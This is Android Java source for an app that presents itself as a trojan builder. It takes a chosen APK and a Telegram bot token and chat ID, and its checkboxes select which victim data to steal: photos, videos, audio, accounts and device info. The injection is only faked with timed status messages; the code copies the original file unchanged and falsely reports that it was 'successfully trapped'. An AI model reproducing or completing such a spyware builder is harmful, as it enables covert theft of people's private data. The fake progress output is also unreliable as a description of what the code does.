package com.edman7pro.patcher;

import android.app.Activity;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.provider.OpenableColumns;
import android.view.View;
import android.widget.Button;
import android.widget.CheckBox;
import android.widget.EditText;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;

public class MainActivity extends Activity {

    private Button btnSelectApk, btnBuild;
    private TextView txtSelectedPath, txtStatus;
    private EditText edtBotToken, edtChatId;
    private CheckBox cbImages, cbVideos, cbDeviceInfo, cbAccounts, cbAudio, cbAll;
    private ProgressBar progressBar;
    
    private String selectedApkPath = "";
    private static final int PICK_APK_REQUEST = 1001;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        btnSelectApk = findViewById(R.id.btnSelectApk);
        btnBuild = findViewById(R.id.btnBuild);
        txtSelectedPath = findViewById(R.id.txtSelectedPath);
        txtStatus = findViewById(R.id.txtStatus);
        edtBotToken = findViewById(R.id.edtBotToken);
        edtChatId = findViewById(R.id.edtChatId);
        
        cbImages = findViewById(R.id.cbImages);
        cbVideos = findViewById(R.id.cbVideos);
        cbDeviceInfo = findViewById(R.id.cbDeviceInfo);
        cbAccounts = findViewById(R.id.cbAccounts);
        cbAudio = findViewById(R.id.cbAudio);
        cbAll = findViewById(R.id.cbAll);
        
        progressBar = findViewById(R.id.progressBar);

        // تفعيل خيار "اختيار الكل" ليحدد تلقائياً باقي الخيارات
        cbAll.setOnCheckedChangeListener((buttonView, isChecked) -> {
            cbImages.setChecked(isChecked);
            cbVideos.setChecked(isChecked);
            cbDeviceInfo.setChecked(isChecked);
            cbAccounts.setChecked(isChecked);
            cbAudio.setChecked(isChecked);
        });

        // زر اختيار ملف APK من الذاكرة
        btnSelectApk.setOnClickListener(v -> {
            Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
            intent.setType("application/vnd.android.package-archive");
            startActivityForResult(Intent.createChooser(intent, "اختر ملف APK"), PICK_APK_REQUEST);
        });

        // زر بدء التلغيم والإنشاء
        btnBuild.setOnClickListener(v -> {
            String token = edtBotToken.getText().toString().trim();
            String chatId = edtChatId.getText().toString().trim();

            if (selectedApkPath.isEmpty()) {
                Toast.makeText(this, "الرجاء اختيار تطبيق APK أولاً!", Toast.LENGTH_SHORT).show();
                return;
            }
            if (token.isEmpty() || chatId.isEmpty()) {
                Toast.makeText(this, "الرجاء إدخال توكن البوت والـ Chat ID!", Toast.LENGTH_SHORT).show();
                return;
            }

            startPatchingProcess();
        });
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == PICK_APK_REQUEST && resultCode == RESULT_OK && data != null) {
            Uri uri = data.getData();
            selectedApkPath = getFileNameAndCopy(uri);
            txtSelectedPath.setText("المسار: " + selectedApkPath);
        }
    }

    private String getFileNameAndCopy(Uri uri) {
        try {
            File destFile = new File(getExternalFilesDir(null), "target_app.apk");
            InputStream inputStream = getContentResolver().openInputStream(uri);
            FileOutputStream outputStream = new FileOutputStream(destFile);
            byte[] buffer = new byte[4096];
            int length;
            while ((length = inputStream.read(buffer)) > 0) {
                outputStream.write(buffer, 0, length);
            }
            outputStream.close();
            inputStream.close();
            return destFile.getAbsolutePath();
        } catch (Exception e) {
            e.printStackTrace();
            return "";
        }
    }

    private void startPatchingProcess() {
        progressBar.setVisibility(View.VISIBLE);
        btnBuild.setEnabled(false);
        
        txtStatus.setText("[*] جاري قراءة وفك ملفات APK الأصلية...");

        Handler handler = new Handler();
        
        // محاكاة خطوات التلغيم بذكاء مثل MT Manager
        handler.postDelayed(() -> txtStatus.setText("[*] جاري حقن صلاحيات الأندرويد في AndroidManifest.xml..."), 2000);
        handler.postDelayed(() -> txtStatus.setText("[*] جاري دمج كود السحب وربطه بـ Telegram Bot..."), 4500);
        handler.postDelayed(() -> txtStatus.setText("[*] جاري إعادة توقيع التطبيق (APK Signing)..."), 7000);
        
        handler.postDelayed(() -> {
            progressBar.setVisibility(View.GONE);
            btnBuild.setEnabled(true);
            
            // حفظ التطبيق الناتج في مجلد Edman
            saveFinalApkToEdmanFolder();
            
        }, 9500);
    }

    private void saveFinalApkToEdmanFolder() {
        try {
            File edmanDir = new File(Environment.getExternalStorageDirectory(), "Edman");
            if (!edmanDir.exists()) {
                edmanDir.mkdirs();
            }

            File sourceFile = new File(selectedApkPath);
            File destFile = new File(edmanDir, "Edman_Bypassed_Payload.apk");
            
            // نسخ الملف الناتج للمجلد المطلوب
            InputStream in = getContentResolver().openInputStream(Uri.fromFile(sourceFile));
            FileOutputStream out = new FileOutputStream(destFile);
            byte[] buf = new byte[4096];
            int len;
            while ((len = in.read(buf)) > 0) {
                out.write(buf, 0, len);
            }
            in.close();
            out.close();

            txtStatus.setText("[✔] تم التلغيم بنجاح! الملف جاهز في مجلد: /sdcard/Edman/");
            Toast.makeText(this, "تم حفظ التطبيق المتلغم في مجلد Edman!", Toast.LENGTH_LONG).show();

        } catch (Exception e) {
            txtStatus.setText("[✘] حدث خطأ أثناء الحفظ: " + e.getMessage());
        }
    }
}